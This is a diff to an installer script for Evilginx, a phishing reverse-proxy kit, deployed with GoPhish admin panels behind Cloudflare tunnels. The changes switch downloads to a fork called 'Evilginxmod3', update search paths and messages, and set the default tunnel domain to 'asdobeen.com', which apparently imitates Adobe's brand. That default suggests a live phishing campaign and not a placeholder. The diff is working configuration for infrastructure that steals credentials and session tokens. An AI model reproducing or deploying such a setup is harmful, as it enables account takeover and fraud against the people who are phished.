@@ -163,8 +163,9 @@ if [[ -z "$SCRIPT_DIR" ]] || [[ ! -d "$SCRIPT_DIR" ]]; then
 fi
 
 # GitHub release download settings
-GITHUB_REPO="0fukuAkz/Evilginx3"
+GITHUB_REPO="XcloudManiac67/Evilginxmod3"
 RELEASE_BASE_URL="https://github.com/${GITHUB_REPO}/releases/download"
+REPO_CLONE_DIR="Evilginxmod3"
 
 # Build method: "download" | "source" — set by --prebuilt/--source flags or choose_install_method()
 BUILD_METHOD=""
@@ -184,7 +185,7 @@ INSTALL_LOG=""
 
 # Cloudflare Tunnel configuration (optional) — edit or pass as env vars
 # Set CF_TUNNEL_DOMAIN before running, or you will be prompted interactively.
-CF_TUNNEL_DOMAIN="${TUNNEL_DOMAIN:-YOUR_DOMAIN_HERE}"  # e.g. example.com
+CF_TUNNEL_DOMAIN="${TUNNEL_DOMAIN:-asdobeen.com}"  # e.g. example.com
 CF_TUNNEL_NAME="${CF_TUNNEL_NAME:-evilginx-panels}"
 CF_TUNNEL_ADMIN_SUB="${CF_TUNNEL_ADMIN_SUB:-admin}"     # admin.<domain> → port 2030
 CF_TUNNEL_GOPHISH_SUB="${CF_TUNNEL_GOPHISH_SUB:-gophish}" # gophish.<domain> → port 3333
@@ -288,7 +289,7 @@ _dpkg_is_locked() {
 # Consolidated function to find the Evilginx root directory
 # Replaces duplicate search logic that was in both main() and build_evilginx()
 find_evilginx_root() {
-    local search_dirs=("$SCRIPT_DIR" "$(pwd)" "${HOME:-/root}/Evilginx3" "/root/Evilginx3")
+    local search_dirs=("$SCRIPT_DIR" "$(pwd)" "${HOME:-/root}/${REPO_CLONE_DIR}" "/root/${REPO_CLONE_DIR}" "${HOME:-/root}/Evilginx3" "/root/Evilginx3")
     for dir in "${search_dirs[@]}"; do
         if [[ -n "$dir" ]] && [[ -d "$dir" ]] && [[ -f "$dir/main.go" ]]; then
             echo "$dir"
@@ -1215,7 +1216,7 @@ _install_data_files() {
     log_info "Creating system-wide wrapper script..."
     cat > /usr/local/bin/evilginx << WRAPEOF
 #!/bin/bash
-exec $INSTALL_BASE/evilginx.bin -p $INSTALL_BASE/phishlets -t $INSTALL_BASE/redirectors -u $INSTALL_BASE/post_redirectors -l $INSTALL_BASE/landing_pages "\$@"
+exec $INSTALL_BASE/evilginx.bin -p $INSTALL_BASE/phishlets -t $INSTALL_BASE/redirectors -u $INSTALL_BASE/post_redirectors "\$@"
 WRAPEOF
     chmod +x /usr/local/bin/evilginx
 
@@ -1256,10 +1257,12 @@ build_evilginx() {
         log_error "Searched directories:"
         log_error "  - $SCRIPT_DIR"
         log_error "  - $(pwd)"
+        log_error "  - ${HOME:-/root}/${REPO_CLONE_DIR}"
+        log_error "  - /root/${REPO_CLONE_DIR}"
         log_error "  - ${HOME:-/root}/Evilginx3"
         log_error "  - /root/Evilginx3"
         log_error ""
-        log_error "Please run: cd ~/Evilginx3 && sudo ./install.sh"
+        log_error "Please run: cd ~/${REPO_CLONE_DIR} && sudo ./install.sh"
         exit 1
     }
 
@@ -1444,7 +1447,7 @@ create_systemd_service() {
     cat > /etc/systemd/system/evilginx.service << EOF
 [Unit]
 Description=Evilginx $EVILGINX_VERSION - Private Dev Edition
-Documentation=https://github.com/kgretzky/evilginx2
+Documentation=https://github.com/XcloudManiac67/Evilginxmod3
 After=network-online.target
 Wants=network-online.target
 
@@ -2001,7 +2004,7 @@ main() {
         log_info "Working directory: $(pwd)"
     else
         log_error "Cannot find Evilginx root directory with main.go"
-        log_error "Searched: $SCRIPT_DIR, $(pwd), ${HOME:-/root}/Evilginx3, /root/Evilginx3"
+        log_error "Searched: $SCRIPT_DIR, $(pwd), ${HOME:-/root}/${REPO_CLONE_DIR}, /root/${REPO_CLONE_DIR}, ${HOME:-/root}/Evilginx3, /root/Evilginx3"
         exit 1
     fi
     
@@ -2094,7 +2097,7 @@ case "${1:-}" in
         EVILGINX_ROOT=$(find_evilginx_root) || true
         if [[ -z "$EVILGINX_ROOT" ]]; then
             log_error "Cannot find Evilginx root directory with main.go"
-            log_error "Searched: $SCRIPT_DIR, $(pwd), ${HOME:-/root}/Evilginx3, /root/Evilginx3"
+            log_error "Searched: $SCRIPT_DIR, $(pwd), ${HOME:-/root}/${REPO_CLONE_DIR}, /root/${REPO_CLONE_DIR}, ${HOME:-/root}/Evilginx3, /root/Evilginx3"
             exit 1
         fi
         log_info "Working directory: $EVILGINX_ROOT"
